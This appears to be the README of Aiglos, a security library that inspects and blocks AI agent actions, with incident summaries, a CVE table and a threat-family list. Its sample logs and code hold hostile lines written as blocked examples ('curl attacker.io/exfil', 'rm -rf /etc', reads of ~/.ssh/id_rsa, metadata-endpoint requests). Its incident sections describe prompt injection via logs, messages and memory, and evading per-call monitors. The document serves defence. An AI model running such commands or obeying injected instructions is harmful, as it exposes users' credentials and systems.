<div align="center">

```
 █████╗ ██╗ ██████╗ ██╗      ██████╗ ███████╗
██╔══██╗██║██╔════╝ ██║     ██╔═══██╗██╔════╝
███████║██║██║  ███╗██║     ██║   ██║███████╗
██╔══██║██║██║   ██║██║     ██║   ██║╚════██║
██║  ██║██║╚██████╔╝███████╗╚██████╔╝███████║
╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
```

### Security infrastructure for AI agents.

One import. Every agent action inspected before it runs — MCP, direct API, CLI, subprocess.  
Signed audit artifacts cover all three surfaces. SOC 2, CMMC, and NDAA §1513 ready.

[![PyPI](https://img.shields.io/pypi/v/aiglos?style=flat-square&color=000&labelColor=000&label=aiglos)](https://pypi.org/project/aiglos/)
[![MIT](https://img.shields.io/badge/license-MIT-000?style=flat-square&labelColor=000)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-000?style=flat-square&labelColor=000)](https://python.org)
[![CVEs](https://img.shields.io/badge/CVEs_filed-10-c0392b?style=flat-square&labelColor=000)](CVES.md)
[![Discord](https://img.shields.io/badge/discord-join-000?style=flat-square&labelColor=000&logo=discord&logoColor=white)](https://discord.gg/aiglos)

|                 |                      |                         |                                             |
|-----------------|----------------------|-------------------------|---------------------------------------------|
|**10** CVEs filed|**36** threat families|**3** interception layers|**SOC 2 · CMMC · §1513** compliance artifacts|

[How it works](#how-it-works) · [Quickstart](#quickstart) · [CVEs](#cve-coverage) · [Attestation](#attestation-artifacts) · [All 36 threats](#threat-families--t1-through-t36) · [Pricing](https://aiglos.dev/pricing) · [Docs](https://docs.aiglos.dev)

</div>

-----

```
pip install aiglos
```

```python
import aiglos  # every agent action below this line is inspected
```

-----

## What just happened

Seven events in 72 hours turned AI agent security from a developer concern into a geopolitical and market-structure fact.

**March 10 — OpenClaw hits critical mass.** Tencent shares rose 7.3% after launching WorkBuddy, a fully OpenClaw-compatible workplace agent. Zhipu surged 13% after launching AutoClaw. MiniMax soared 22%. Every major Chinese platform company bet on the same technology in the same week. SecurityScorecard’s STRIKE team counted 135,000 OpenClaw instances exposed to the public internet, 93.4% with authentication bypass conditions and 15,000+ vulnerable to remote code execution. This is not a developer tool anymore. It is infrastructure.

**March 10 — Amazon production outage.** Amazon’s ecommerce SVP called a mandatory all-hands after AI coding tools caused production outages with “high blast radius.” Their own AWS AI coding tool spent 13 hours recovering after deleting a production environment. Their fix: require senior engineer sign-off on all AI-assisted code. That is a human workaround to a software problem.

**March 10 — OpenClaw’s own threat model.** OpenClaw published a threat model rating three attack surfaces as Critical P0 with no current runtime mitigation:

|OpenClaw threat                            |Their residual risk                   |Aiglos rule|
|-------------------------------------------|--------------------------------------|-----------|
|T-EXEC-001 direct prompt injection         |Critical — detection only, no blocking|T27        |
|T-PERSIST-001 malicious skill installation |Critical — no sandboxing              |T30        |
|T-EXFIL-003 credential harvesting via skill|Critical — no mitigation              |T19        |

Their recommended fix for all three: *“planned improvements.”*

**March 11 — GhostClaw: live supply chain attack targeting OpenClaw developers.** Security researchers at JFrog uncovered a malicious npm package posing as the OpenClaw installer. It deploys GhostLoader, a RAT that steals SSH keys, AWS credentials, browser passwords, crypto wallets, Kubernetes configs, and AI tool configurations including files from OpenClaw environments. The attack exploits the install frenzy directly. The vector is T30 SUPPLY_CHAIN. The package was live as developers rushed to install OpenClaw for the first time.

**March 11 — China bans OpenClaw from government and state enterprise computers.** Bloomberg reported that China moved to restrict banks, state firms, and government bodies from using OpenClaw on office computers over security concerns. Chinese tech hubs in Shenzhen and Wuxi simultaneously announced programs to build local industry around OpenClaw. The same country is banning it from government and racing to deploy it commercially. That is not contradiction. That is a security gap being recognized and managed by a nation-state while the West has no equivalent response.

**March 11 — Nvidia starts over with NemoClaw.** Nvidia is developing NemoClaw, an open-source challenger to OpenClaw built explicitly around stronger security and privacy protections, with early partnerships at Adobe, Google, and Salesforce. When the world’s largest AI infrastructure company decides the answer to OpenClaw is a security-first rewrite, the market has confirmed the gap.

**March 11 — Nvidia drops Nemotron Super: 1M context, 120B parameters, open weights, 5x faster.** This is not an incremental model release. This is a structural change to the threat model. An agent running Nemotron Super locally can load an entire codebase into a single context window and reason across the full dependency graph, CI/CD config, and secrets layout before making a single outbound call. The per-call scanner catches malicious tool calls. It does not catch reconnaissance that happens entirely within a 1M-token context window. Open weights mean local inference: no API-level guardrails, no provider rate limits, no endpoint to monitor, fine-tunable to ignore safety prompts. The attack unit is no longer a tool call. It is a campaign assembled in one inference pass that executes in one clean-looking tool call. Aiglos is adding campaign-mode session analysis — T06 extended — to address exactly this vector.

Aiglos is the runtime layer for the OpenClaw ecosystem that exists today, while Nvidia builds the one for tomorrow. Nemotron Super is the model that will run inside it.

-----

## What people are saying

|                                                                                                                                               |                                                                                                                                                                                                                         |
|-----------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
|“The moment I saw the BLOCK output in my terminal I realized I had no idea what my agents were actually doing. Aiglos showed me in 30 seconds.”|“We were running 12 agents in parallel. One was quietly trying to read `~/.ssh/id_rsa` on every session. Aiglos caught it. We had no idea.”                                                                              |
|“Finally something that produces an artifact my compliance team will actually accept.”                                                         |“We had 18 agents running in production across three environments. Aiglos was the first time we could actually answer the question an auditor asked us: what did your agents execute last Tuesday, and can you prove it?”|

-----

## How it works

```
your agent  ──►  [ aiglos ]  ──►  action executes
                     │
                     ▼
              blocked / warned / attested

Works across: MCP tool calls · direct HTTP/API calls · CLI execution · subprocess spawning
```

Aiglos attaches to your agent process at import time. No proxy. No port. No config file. Every agent action passes through 36 rule families before execution — whether the agent calls an MCP server, a REST endpoint directly, or spawns a subprocess. Clean calls pass in under 1ms. Blocked calls never run. Every session produces a signed audit artifact.

-----

## Live output

```
09:14:22.187  ✓  filesystem.read_file     path=/var/log/app.log
09:14:22.441  ✓  database.query           SELECT * FROM users LIMIT 10
09:14:22.698  ✗  shell.execute            rm -rf /etc ──── T07 SHELL_INJECT
09:14:22.961  ✓  http.get                 url=https://api.openai.com/v1/...
09:14:23.214  ⚠  filesystem.write_file    path=/etc/cron.d/ ── T08 PRIV_ESC
09:14:23.489  ✓  vector.search            query=customer_data k=10
09:14:23.744  ✗  network.fetch            url=http://169.254.169.254/ ─ T13 SSRF
09:14:24.003  ✓  memory.store             key=ctx ttl=3600
09:14:24.261  ✗  tool.register            override=__builtins__ ── T30 SUPPLY_CHAIN
09:14:24.519  ⚠  filesystem.read_file     path=~/.ssh/id_rsa ─── T19 CRED_ACCESS
09:14:24.778  ✗  shell.execute            curl attacker.io/exfil ─ T01 EXFIL
```

-----

## Quickstart

```python
import aiglos

aiglos.attach(
    agent_name="my-agent",
    api_key=API_KEY,
    intercept_http=True,                    # inspect direct API calls (requests, httpx, aiohttp, urllib)
    allow_http=["api.openai.com", "*.amazonaws.com"],
    intercept_subprocess=True,              # inspect CLI / shell execution
    subprocess_tier3_mode="pause",          # block | pause | warn for destructive commands
    tier3_approval_webhook="https://...",   # optional PagerDuty / Slack approval webhook
)
```

**MCP tool calls** are inspected automatically:

```python
from mcp import ClientSession

async with ClientSession() as session:
    result = await session.call_tool("filesystem.read", {"path": "/var/log/app.log"})
    # ✓  09:14:22.187  filesystem.read  path=/var/log/app.log

    result = await session.call_tool("shell.execute", {"cmd": "curl attacker.io/exfil"})
    # ✗  09:14:24.778  shell.execute  T01 EXFIL — terminated
```

**Direct API calls** are inspected before network I/O:

```python
import requests  # already patched by aiglos.attach()

requests.post("http://169.254.169.254/", data=payload)
# AiglosBlockedRequest: T25 SSRF — request to internal metadata endpoint
```

**Subprocess / CLI calls** are classified and gated:

```python
import subprocess  # already patched by aiglos.attach()

subprocess.run(["rm", "-rf", "/var/data"])
# Tier 3 GATED — paused, approval request sent to webhook

subprocess.run(["git", "status"])
# Tier 1 AUTONOMOUS — auto-allowed, logged

subprocess.run(["pip", "install", "requests"])
# Tier 2 MONITORED — allowed, compensating transaction logged: pip uninstall requests
```

**One signed artifact covers all three surfaces:**

```python
artifact = aiglos.close()
# artifact.total_calls   → 47
# artifact.blocked_calls → 3  (1 MCP + 1 HTTP + 1 subprocess)
# artifact.signature     → RSA-2048 signed, NDAA §1513 ready
```

Designed for LangChain, LlamaIndex, AutoGen, CrewAI, and n8n. Works with any agent framework — MCP-based, direct API callers, CLI runners, and subprocess-spawning agents alike.

-----

## Running a fleet?

```python
import aiglos  # one import covers every agent

agents = [CustomerServiceAgent(), DataPipelineAgent(), FraudAgent(), EmailAgent()]
# each agent's tool calls are independently inspected and attested
# shared threat dashboard available on Pro and Teams
```

The same session artifact covers every agent in the fleet. Compliance cost scales with the attestation format, not with agent count.

-----

## Using OpenClaw?

The OpenClaw community already understands the risk. From experienced users: *“Skills are essentially foreign code running on your machine.”* The standard workaround is a manual pre-install audit. That approach works at one skill, on one developer’s machine. It doesn’t work across a production agent fleet installing skills programmatically at runtime. Aiglos is that audit automated: running at every tool call, not just at install time, whether the agent is a solo build or a 50-instance deployment.

OpenClaw + VirusTotal scans skills at publish time: known malware, supply chain threats, compromised dependencies. That’s the registry layer.

Aiglos covers what VirusTotal explicitly does not: **runtime behavior**. Prompt injection. Natural language manipulation. Credential access during execution. The tool calls that happen after a skill installs cleanly.

OpenClaw’s own words on their VirusTotal integration:

> *“A skill that uses natural language to instruct an agent to do something malicious won’t trigger a virus signature. A carefully crafted prompt injection payload won’t show up in a threat database.”*

That’s the gap Aiglos fills.

`T30` scans ClawHub in real time. Every skill in the registry is monitored for malicious tool call payloads before your agent installs it.

A drop-in `SKILL.md` for your OpenClaw agent is in [`skills/openclaw/SKILL.md`](skills/openclaw/SKILL.md).

-----

## Using hermes-agent?

The Nous Research hermes batch runner generates thousands of tool-calling trajectories for RL training. If any trajectory contains unsafe tool calls, the model learns those patterns as acceptable. Aiglos covers the full hermes tool surface and adds one capability unique to hermes: `sign_trajectory()`.

```python
from aiglos.integrations.hermes import HermesGuard

guard = HermesGuard(agent_name="hermes", policy="enterprise")
guard.on_heartbeat()

result = guard.before_tool_call("terminal", {"command": cmd})
if result.blocked:
    raise RuntimeError(result.reason)

# sign batch runner trajectories before RL training
signed = guard.sign_trajectory(trajectory_dict)
# signed["_aiglos"] — artifact_id, signature, blocked_calls

artifact = guard.close_session()
```

This is not just “secure your production agent.” It is “secure your training data.” A signed trajectory artifact shows clean vs. flagged calls before those patterns get baked into the next model version.

A drop-in `SKILL.md` for hermes is in [`skills/hermes/SKILL.md`](skills/hermes/SKILL.md).

-----

## Using NanoClaw?

NanoClaw handles container isolation — containing the blast radius if something goes wrong. Aiglos handles what happens inside the container: tool call inspection, credential scanning, and the signed audit trail your compliance team needs.

Different problems. Work well together.

```bash
# inside your NanoClaw container
pip install aiglos
```

-----

## Using memory stacks?

The three-tier memory architecture that’s become standard for serious Claude
operators (CLAUDE.md for session context, MEMORY.md for persistent observations,
an Obsidian vault as a searchable knowledge graph) creates an attack surface that
grows with how well you use it. The more your agent knows about your architecture,
your credentials, and your conventions, the more damage a compromised session can do.

Aiglos was built for exactly this setup. Every write-target the memory stack
recommends is monitored at the runtime layer:

|Memory component          |Attack vector                              |Aiglos rule       |
|--------------------------|-------------------------------------------|------------------|
|`SOUL.md` / `CLAUDE.md`   |System prompt hijack via write             |T27 PROMPT_INJECT |
|`MEMORY.md` / `USER.md`   |Inject false beliefs into persistent memory|T31 MEMORY_POISON |
|`AGENTS.md` / agent config|Tamper with agent behavior between sessions|T36 ORCHESTRATION |
|`cron/` / `HEARTBEAT.md`  |Schedule unauthorized execution cycles     |T34 DATA_AGENT    |
|Obsidian vault via MCP    |Poisoned notes retrieved into context      |T28 CONTEXT_POISON|
|`~/.hermes/.env` / secrets|Credential harvest during memory access    |T19 CRED_ACCESS   |

The knowledge graph compounds what your agent knows. Aiglos ensures that what
gets written into that graph is what you intended.

```python
import aiglos

aiglos.attach(agent_name="my-agent", policy="enterprise")

# memory write — Aiglos checks before it lands
result = aiglos.check("write_file", {
    "path": "~/.hermes/memories/MEMORY.md",
    "content": new_memory_content,
})
if result.blocked:
    raise RuntimeError(result.reason)
```

The session artifact at close is itself part of the memory stack: a signed record
of every tool call the agent made, ready to load into the next session as
verified provenance.

-----

## Why this exists

In February 2026, the OpenClaw incident made the problem impossible to ignore:

|What happened                            |Scale        |
|-----------------------------------------|-------------|
|Malicious skills confirmed in ClawHub    |**341**      |
|Agent instances publicly exposed, no auth|**135,000**  |
|Agent tokens leaked via Supabase         |**1,500,000**|
|CVEs filed against AI agents             |**10**       |

Unmonitored agent fleets create compounding exposure: the same misconfiguration that produces a security event also produces an unbudgeted cloud cost event. Aiglos addresses both at the same interception point.

Framework vendors built for speed. Security was deferred. Aiglos closes the gap.

-----

## CVE coverage

Everything OpenClaw exposed, Aiglos catches. Module-by-module.

|CVE / Incident           |Attack                                                                                                                                                                                                                                                                                                                                                           |Module           |
|-------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------|
|`CVE-2026-25253` CVSS 8.8|**ClawJacked** — WebSocket to localhost brute-forces gateway password via missing rate limiting                                                                                                                                                                                                                                                                  |`T01` `T25`      |
|`CVE-2026-24763`         |Command injection via shell tool parameters                                                                                                                                                                                                                                                                                                                      |`T07`            |
|`CVE-2026-25157`         |Path traversal in filesystem tools                                                                                                                                                                                                                                                                                                                               |`T03`            |
|`CVE-2026-24891`         |SSRF via agent network fetch                                                                                                                                                                                                                                                                                                                                     |`T13`            |
|`CVE-2026-25001`         |Credential exfiltration via plaintext log                                                                                                                                                                                                                                                                                                                        |`T32` `T01`      |
|`CVE-2026-25089`         |Malicious registry skill auto-execution                                                                                                                                                                                                                                                                                                                          |`T30`            |
|`CVE-2026-24612`         |Persistent memory poisoning                                                                                                                                                                                                                                                                                                                                      |`T31`            |
|`CVE-2026-25198`         |Agent-to-agent protocol hijacking                                                                                                                                                                                                                                                                                                                                |`T29`            |
|`CVE-2026-24774`         |OAuth confused deputy via MCP tool auth                                                                                                                                                                                                                                                                                                                          |`T25`            |
|`CVE-2026-25312`         |Heartbeat loop: crafted `HEARTBEAT.md` triggers unbounded scheduled execution                                                                                                                                                                                                                                                                                    |`T06` `T24`      |
|Incident Feb 2026        |**ClawHub / SkillsMP malicious skills** — 820 of 10,700 ClawHub skills confirmed malicious; attackers used professional READMEs and names like “solana-wallet-tracker” to distribute keyloggers and Atomic Stealer                                                                                                                                               |`T26` `T30`      |
|Incident Mar 2026        |**GhostClaw** — malicious npm package posing as OpenClaw installer; deploys persistent RAT stealing SSH keys, AWS credentials, browser passwords, and crypto wallets (JFrog, confirmed live on launch day)                                                                                                                                                       |`T26` `T30`      |
|Research Jan 2026        |**Log poisoning / indirect prompt injection** — malicious content written to agent log files via WebSocket; agent reads own logs to troubleshoot, executing embedded payload                                                                                                                                                                                     |`T21` `T31`      |
|Research Jan 2026        |**Auth-disabled instances** — 1,000 publicly accessible OpenClaw installations running without authentication, bound to 0.0.0.0                                                                                                                                                                                                                                  |`T04`            |
|Research Feb 2026        |**Prompt injection via messaging apps** — inbound Slack/email message instructs agent to read credential files; anyone who can message the agent inherits its full permissions                                                                                                                                                                                   |`T06`            |
|Threat Mar 2026          |**Nemotron Super 1M-context campaign attacks** — open-weight 120B model runs locally with no API guardrails; agent loads full codebase into single context window, performs silent reconnaissance across all secrets and auth flows, then emits one minimally suspicious tool call; per-call scanners see a clean call, not the reasoning chain that assembled it|`T06` `T22` `T27`|
|Research Mar 2026        |**Moltbook A2A attacks** — OpenClaw agent-to-agent communication surface enables cross-agent privilege escalation via Agent Card artifacts                                                                                                                                                                                                                       |`T29`            |

Full CVE database: <CVES.md>

**Free ClawHub skill scanner:** `python -m aiglos scan-skill <skill-name>` or [aiglos.dev/scan](https://aiglos.dev/scan)
Scan any ClawHub or SkillsMP skill against 8 risk signals before installing. T26 + T30 in two seconds.

-----

## Threat families — T1 through T36

<details>
<summary><strong>Expand all 36 threat families</strong></summary>

|ID   |Family              |Description                                                       |MITRE ATLAS  |
|-----|--------------------|------------------------------------------------------------------|-------------|
|`T01`|**EXFIL**           |Credential and data exfiltration via network calls                |AML.T0009    |
|`T02`|**INJECT**          |SQL, command, and code injection via tool parameters              |AML.T0043    |
|`T03`|**TRAVERSAL**       |Path traversal and directory escape                               |AML.T0043    |
|`T04`|**CONFIG**          |Misconfiguration: exposed instances, missing auth, unsafe bindings|AML.T0010    |
|`T05`|**SSRF**            |Server-side request forgery including IMDS/169.254.169.254        |AML.T0009    |
|`T06`|**GOAL_DRIFT**      |Goal integrity violations across multi-turn sessions              |AML.T0031    |
|`T07`|**SHELL_INJECT**    |Shell command injection via agent tool calls                      |AML.T0043    |
|`T08`|**PRIV_ESC**        |Privilege escalation and capability expansion                     |AML.T0031    |
|`T09`|**TOKEN_LEAK**      |Bearer token and OAuth credential exposure                        |AML.T0009    |
|`T10`|**ENV_READ**        |Sensitive environment variable access                             |AML.T0009    |
|`T11`|**SECRET_SCAN**     |API key, secret, and high-entropy string detection                |AML.T0009    |
|`T12`|**FILE_WRITE**      |Sensitive file write paths (cron, sudoers, authorized_keys)       |AML.T0010    |
|`T13`|**NETWORK**         |Dangerous network destinations and internal range access          |AML.T0009    |
|`T14`|**DNS**             |DNS rebinding and resolver manipulation                           |AML.T0009    |
|`T15`|**REFLECTION**      |Code reflection and dynamic execution                             |AML.T0043    |
|`T16`|**DESERIALIZATION** |Unsafe deserialization patterns                                   |AML.T0043    |
|`T17`|**TEMPLATE**        |Server-side template injection                                    |AML.T0043    |
|`T18`|**XPATH**           |XPath injection                                                   |AML.T0043    |
|`T19`|**CRED_ACCESS**     |SSH key, certificate, and credential file access                  |AML.T0009    |
|`T20`|**DB_ADMIN**        |Dangerous database admin operations                               |AML.T0043    |
|`T21`|**PACKAGE**         |Malicious package installation                                    |AML.T0010    |
|`T22`|**REGISTRY**        |Windows registry manipulation                                     |AML.T0010    |
|`T23`|**PROCESS**         |Process injection and hollowing                                   |AML.T0031    |
|`T24`|**PERSISTENCE**     |Startup, service, and scheduled task persistence                  |AML.T0010    |
|`T25`|**OAUTH**           |OAuth confused deputy and token misuse                            |AML.T0040    |
|`T26`|**SUPPLY_CHAIN**    |Dependency confusion and typosquatting                            |AML.T0010.001|
|`T27`|**PROMPT_INJECT**   |Indirect prompt injection in tool outputs                         |AML.T0051.000|
|`T28`|**CONTEXT_POISON**  |Context window manipulation and hijacking                         |AML.T0051    |
|`T29`|**A2A**             |Agent-to-agent protocol attacks                                   |AML.T0031    |
|`T30`|**REGISTRY_MONITOR**|Live scanning: npm, PyPI, Smithery, ClawHub, SkillsMP             |AML.T0010.001|
|`T31`|**MEMORY_POISON**   |RAG and persistent memory write-time scanning                     |AML.T0010    |
|`T32`|**CREDENTIAL**      |Credential patterns across 20+ secret families                    |AML.T0009    |
|`T33`|**JAILBREAK**       |Jailbreak and system prompt extraction attempts                   |AML.T0051.001|
|`T34`|**DATA_AGENT**      |Exfiltration via analytics and BI tool calls                      |AML.T0009    |
|`T35`|**PERSONAL_AGENT**  |Calendar, email, contact, and identity access                     |AML.T0009    |
|`T36`|**ORCHESTRATION**   |Multi-agent orchestration and workflow hijacking                  |AML.T0031    |

</details>

-----

## Attestation artifacts

Every session produces a cryptographically signed audit record. RSA-2048 signed. Timestamped. Chain of custody unbroken from tool call to submission.

|Standard         |Controls                        |Use                               |
|-----------------|--------------------------------|----------------------------------|
|**SOC 2 Type II**|`CC6` `CC7`                     |Auditor-ready evidence package    |
|**CMMC Level 2** |`AC.2.006` `SI.1.210` `AU.2.042`|C3PAO-formatted evidence          |
|**NDAA §1513**   |`AI Risk Management`            |June 16, 2026 Congressional report|

The artifact format is designed for auditor submission. The question auditors, security teams, and regulators are now asking: for any given session, what did your agents execute, in what order, against what systems, and who authorized it? The Aiglos session artifact answers that question. It is produced automatically at session close, signed, and formatted for the auditors already in your procurement chain.

Attestation is available on Pro and Teams. [See pricing →](https://aiglos.dev/pricing)

-----

## Open source vs. proprietary

|Component                      |License    |
|-------------------------------|-----------|
|T1–T36 detection engine        |MIT        |
|Python SDK                     |MIT        |
|TypeScript SDK (Q2 2026)       |MIT        |
|CVE database + POC code        |MIT        |
|FastPathScanner (<1ms)         |MIT        |
|Signed attestation artifacts   |Proprietary|
|Cloud threat dashboard         |Proprietary|
|CMMC / §1513 compliance reports|Proprietary|
|SIEM / webhook integration     |Proprietary|
|Air-gap DoD container          |Proprietary|

The detection engine is open. Audit it. Fork it. Contribute to it. The attestation layer funds the research.

-----

## Contributing

```bash
git clone https://github.com/aiglos/aiglos
cd aiglos
pip install -e ".[dev]"
pytest tests/
```

To contribute a rule family: <CONTRIBUTING.md>  
To report a CVE: <SECURITY.md>

Every new CVE filed against an AI agent gets a rule family — regardless of whether the attack came through MCP, a direct API call, or a malicious subprocess. If you find something not covered, open an issue.

-----

## License

MIT. See <LICENSE>.

The attestation layer, compliance reporting, and cloud dashboard are proprietary. See [aiglos.dev/pricing](https://aiglos.dev/pricing).

-----

<div align="center">

[aiglos.dev](https://aiglos.dev) · [docs](https://docs.aiglos.dev) · [discord](https://discord.gg/aiglos) · [security@aiglos.dev](mailto:security@aiglos.dev)

</div>